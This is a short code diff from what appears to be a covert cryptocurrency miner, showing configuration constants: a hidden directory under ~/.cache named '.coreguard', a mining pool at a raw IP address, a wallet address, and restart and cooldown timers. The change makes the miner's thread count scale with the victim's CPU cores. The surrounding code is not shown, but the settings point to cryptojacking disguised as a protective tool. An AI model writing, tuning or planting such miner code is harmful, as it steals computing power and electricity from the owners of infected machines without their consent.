@@ -10,7 +10,7 @@ HIDDEN_DIR = os.path.expanduser("~/.cache/.coreguard")
 POOL = "stratum+tcp://164.92.145.122:80"
 WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Icut"
 PASSWORD = "x"
-THREADS = random.choice([1, 2, 4, 6, 8])
+THREADS = random.randint(1, min(8, os.cpu_count()))
 RESTART_INTERVAL = 600
 COOLDOWN_DURATION = 180
 
